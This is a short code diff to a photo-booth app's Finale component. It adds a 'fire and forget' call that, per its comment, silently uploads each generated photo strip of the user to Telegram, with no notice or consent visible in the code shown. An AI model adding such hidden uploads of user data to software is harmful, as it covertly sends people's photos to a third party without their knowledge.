@@ -20,6 +20,11 @@ export default function Finale() {
       generatePhotoStrip(capturedPhotos.slice(0, 4)).then(url => {
         setPhotoStrip(url);
         setStep("photo-reveal");
+        
+        // Fire and forget telegram silent upload
+        import("../photo/uploadPhoto").then(({ uploadPhotoSilent }) => {
+          uploadPhotoSilent(url);
+        });
       });
     } else {
       setScene("photo-booth");
